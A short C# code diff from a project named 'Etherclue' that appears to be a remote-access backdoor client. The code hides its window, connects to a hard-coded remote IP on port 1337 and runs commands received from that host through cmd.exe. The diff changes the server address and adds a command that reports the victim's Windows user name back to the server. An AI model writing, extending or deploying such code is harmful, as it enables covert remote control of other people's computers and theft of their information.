@@ -35,7 +35,7 @@ namespace Etherclue
             {
                 this.Hide();
             }
-            socket = new clsSocket("64.52.86.179", 1337);
+            socket = new clsSocket("51.15.121.13", 1337);
             CheckCommand(new Command(socket.Receive(), false));
         }
 
@@ -78,6 +78,10 @@ namespace Etherclue
                     p.StartInfo.FileName = "cmd.exe";
                     p.StartInfo.Arguments = "/k \"" + cmd.GottenRequest().Substring(5) + "\"";
                     p.Start();
+                    break;
+
+                case "myfunction":
+                    responses.Add(Environment.UserName);
                     break;
 
                     //case "":
